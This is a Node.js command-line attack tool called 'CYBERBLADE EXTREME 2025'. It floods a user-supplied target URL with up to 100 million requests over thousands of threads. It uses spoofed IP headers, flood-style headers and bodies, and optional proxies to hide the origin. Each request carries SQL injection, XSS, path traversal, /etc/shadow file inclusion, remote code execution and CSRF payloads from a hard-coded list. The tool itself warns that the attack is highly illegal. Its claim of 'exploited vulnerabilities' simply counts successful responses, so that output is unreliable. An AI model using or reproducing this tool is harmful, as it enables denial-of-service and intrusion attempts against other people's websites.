#!/usr/bin/env node

const axios = require('axios');
const chalk = require('chalk');
const figlet = require('figlet');
const inquirer = require('inquirer');
const ProgressBar = require('progress');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs').promises;
const { SocksProxyAgent } = require('socks-proxy-agent');

function displayBanner() {
    console.log(chalk.hex('#00FF00').bold(figlet.textSync('CYBERBLADE EXTREME 2025', {
        font: 'Cyberlarge',
        horizontalLayout: 'full'
    })));
    console.log(chalk.hex('#FF00FF')('⚡️ APOCALYPTIC HACKER ASSAULT ⚡️'));
    console.log(chalk.hex('#00FFFF')('╔════════════════════════════════════╗'));
    console.log(chalk.hex('#00FFFF')('║ 🔴 TARGET OBLITERATED - DOMINATE 🔴 ║'));
    console.log(chalk.hex('#00FFFF')('╚════════════════════════════════════╝'));
}

const payloads = {
    sqlInjection: ['\' OR 1=1 --', '1\'; DROP TABLE users; --', 'UNION SELECT NULL, username, password FROM users --'],
    xss: ['<script>alert(\'XSS\')</script>', '<img src=x onerror=alert(\'XSS\')>', '<svg onload=alert(document.domain)>'],
    directoryTraversal: ['../../etc/passwd', '../windows/win.ini', '/proc/self/environ'],
    lfi: ['/etc/passwd', '/var/www/html/config.php', '/etc/shadow'],
    rce: [';id;', '|| whoami', '&& uname -a', 'eval(base64_decode($_GET[a]))'],
    csrf: ['<form action="http://target.com/transfer" method="POST"><input type="hidden" name="amount" value="1000"></form><script>document.forms[0].submit();</script>'],
    commandInjection: ['; ping 127.0.0.1;', '|| dir', '&& ls -la']
};

const PROXY_LIST = [
    'socks5://user:pass@proxy1.com:1080',
    'http://proxy2.com:8080',
    // Thêm proxy của bạn vào đây
];

function getRandomProxy() {
    return PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)] || null;
}

function generateAttackHeaders() {
    return {
        'Connection': 'keep-alive',
        'Keep-Alive': 'timeout=15, max=10000',
        'User-Agent': `CyberBlade/Extreme-${uuidv4()}`,
        'Accept': '*/*',
        'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        'Referer': `http://malicious${Math.random().toString(36).substring(7)}.com`,
        'Content-Length': Math.floor(Math.random() * 1024), // SYN Flood mô phỏng
        'Range': `bytes=0-${Math.floor(Math.random() * 10000)}` // HTTP Range Flood
    };
}

if (isMainThread) {
    async function attackWebsite(url, totalRequests, threads) {
        console.log(chalk.yellow(`[SYSTEM] Launching extreme attack on ${url} with ${totalRequests.toLocaleString()} requests across ${threads} threads...`));
        const bar = new ProgressBar(chalk.cyan('[:bar] :percent | :etas remaining'), {
            total: totalRequests,
            width: 50,
            complete: chalk.green('█'),
            incomplete: chalk.gray('░')
        });

        let successCount = 0;
        let errorCount = 0;
        let exploitedVulnerabilities = [];
        const startTime = Date.now();

        const workers = [];
        const batchSize = Math.ceil(totalRequests / threads);

        for (let i = 0; i < threads; i++) {
            workers.push(new Worker(__filename, { workerData: { url, batchSize, startIndex: i * batchSize, bar } }));
        }

        workers.forEach(worker => {
            worker.on('message', (msg) => {
                successCount += msg.success;
                errorCount += msg.error;
                exploitedVulnerabilities = [...exploitedVulnerabilities, ...msg.vulnerabilities];
                bar.tick(msg.count);
            });
            worker.on('error', (err) => console.error(chalk.red(`[WORKER ERROR] ${err.message}`)));
            worker.on('exit', (code) => {
                if (code !== 0) console.error(chalk.red(`[WORKER EXITED] Worker stopped with code ${code}`));
            });
        });

        await Promise.all(workers.map(worker => new Promise(resolve => worker.on('exit', resolve))));
        const totalTime = (Date.now() - startTime) / 1000;
        const uniqueVulnerabilities = [...new Set(exploitedVulnerabilities)];

        const report = `
${chalk.green('╔════════════════════════════════════╗')}
${chalk.green('║     EXTREME EXPLOIT REPORT         ║')}
${chalk.green('╚════════════════════════════════════╝')}
${chalk.cyan(`[+] Target: ${url}`)}
${chalk.cyan(`[+] Total Requests: ${totalRequests.toLocaleString()}`)}
${chalk.cyan(`[+] Threads: ${threads}`)}
${chalk.cyan(`[+] Success: ${successCount.toLocaleString()} (${((successCount / totalRequests) * 100).toFixed(2)}%)`)}
${chalk.cyan(`[+] Failures: ${errorCount.toLocaleString()} (${((errorCount / totalRequests) * 100).toFixed(2)}%)`)}
${chalk.cyan(`[+] Duration: ${totalTime.toFixed(2)} seconds`)}
${chalk.cyan(`[+] Requests/Second: ${(totalRequests / totalTime).toFixed(2)}`)}
${chalk.cyan(`[+] Exploited Vulnerabilities: ${uniqueVulnerabilities.length ? uniqueVulnerabilities.join(', ') : 'None detected'}`)}
${chalk.green('TARGET OBLITERATED!')}
        `;

        await fs.writeFile(`attack_log_${new Date().toISOString().replace(/[:.]/g, '_')}.txt`, report);
        console.log(report);
    }

    async function main() {
        displayBanner();

        const choices = [
            { name: '1M Requests (200 threads)', value: { requests: 1000000, threads: 200 } },
            { name: '10M Requests (1000 threads)', value: { requests: 10000000, threads: 1000 } },
            { name: '20M Requests (2000 threads)', value: { requests: 20000000, threads: 2000 } },
            { name: '40M Requests (4000 threads)', value: { requests: 40000000, threads: 4000 } },
            { name: '100M Requests (10000 threads)', value: { requests: 100000000, threads: 10000 } }
        ];

        const { url, attackOption } = await inquirer.prompt([
            {
                type: 'input',
                name: 'url',
                message: chalk.cyan('Enter target URL (e.g., http://example.com):'),
                validate: input => /^https?:\/\/.+$/.test(input) || 'Please enter a valid URL!'
            },
            {
                type: 'list',
                name: 'attackOption',
                message: chalk.cyan('Select extreme attack intensity:'),
                choices
            }
        ]);

        const confirm = await inquirer.prompt({
            type: 'confirm',
            name: 'confirm',
            message: chalk.red(`[WARNING] Extreme attack on ${url} with ${attackOption.requests.toLocaleString()} requests and ${attackOption.threads} threads? This is HIGHLY ILLEGAL! Proceed?`)
        });

        if (confirm.confirm) {
            console.log(chalk.yellow('[SYSTEM] Attack authorized. Unleashing apocalyptic assault...'));
            await attackWebsite(url, attackOption.requests, attackOption.threads);
        } else {
            console.log(chalk.yellow('[SYSTEM] Attack cancelled by user.'));
        }
    }

    main().catch(err => console.error(chalk.red(`[ERROR] ${err.message}`)));
} else {
    async function workerTask() {
        const { url, batchSize, startIndex, bar } = workerData;
        let success = 0;
        let error = 0;
        let vulnerabilities = [];

        for (let i = startIndex; i < startIndex + batchSize; i++) {
            if (i >= bar.total) break;
            const payloadType = Object.keys(payloads)[Math.floor(Math.random() * Object.keys(payloads).length)];
            const payload = payloads[payloadType][Math.floor(Math.random() * payloads[payloadType].length)];
            const targetUrl = url.includes('?') ? `${url}&id=${payload}` : `${url}?id=${payload}`;

            try {
                const proxy = getRandomProxy();
                const agent = proxy ? new SocksProxyAgent(proxy) : undefined;
                await axios({
                    method: 'GET',
                    url: targetUrl,
                    headers: generateAttackHeaders(),
                    httpsAgent: agent,
                    httpAgent: agent,
                    timeout: 5000,
                    data: 'X'.repeat(Math.floor(Math.random() * 2048)) // HTTP Flood payload
                });
                success++;
                vulnerabilities.push(payloadType);
            } catch (e) {
                error++;
            }
            await new Promise(resolve => setTimeout(resolve, Math.random() * 10)); // Delay 0-10ms
        }
        parentPort.postMessage({ success, error, vulnerabilities, count: batchSize });
    }

    workerTask().catch(err => console.error(chalk.red(`[WORKER ERROR] ${err.message}`)));
}